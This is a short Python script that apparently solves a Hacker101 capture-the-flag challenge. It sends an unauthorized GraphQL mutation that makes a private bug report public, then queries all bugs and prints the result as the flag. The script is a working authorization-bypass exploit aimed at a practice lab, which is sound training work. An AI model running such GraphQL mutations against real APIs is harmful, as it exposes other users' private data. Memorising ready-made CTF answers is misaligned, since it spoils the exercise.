# Importing get function from requests module #
from requests import get as get_request
# Getting CTF ID fron User #
ctf_id = input("[1] Enter your ctf id: ")
# Handling Exceptions #
try:
    # Getting Flag fron CTF #
    get_request(f"https://{ctf_id}.ctf.hacker101.com/graphql?operationName=undefined&query=mutation%7B%0A%20%20modifyBug(id%3A2%2C%20private%3Afalse)%20%7B%0A%20%20%20%20ok%0A%20%20%7D%0A%7D%0A%0A%0Aquery%7B%0A%20%20allBugs%20%7B%0A%20%20%20%20id%0A%20%20%20%20reporter%20%7B%0A%20%20%20%20%20%20id%0A%20%20%20%20%20%20username%0A%20%20%20%20%7D%0A%20%20%20%20reporterId%0A%20%20%20%20text%0A%20%20%20%20private%0A%20%20%7D%0A%7D")
    response = get_request(f"https://{ctf_id}.ctf.hacker101.com/graphql?operationName=undefined&query=query%7B%0A%20%20allBugs%20%7B%0A%20%20%20%20id%0A%20%20%20%20reporter%20%7B%0A%20%20%20%20%20%20id%0A%20%20%20%20%20%20username%0A%20%20%20%20%7D%0A%20%20%20%20reporterId%0A%20%20%20%20text%0A%20%20%20%20private%0A%20%20%7D%0A%7D")
    # If flag found successfully print flag, if not then show error #
    if response.status_code == 200:
        print(f"\033[32m[2] Your flag is: {response.text}\033[0m")
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[32m[2] {str(e)}\033[0m")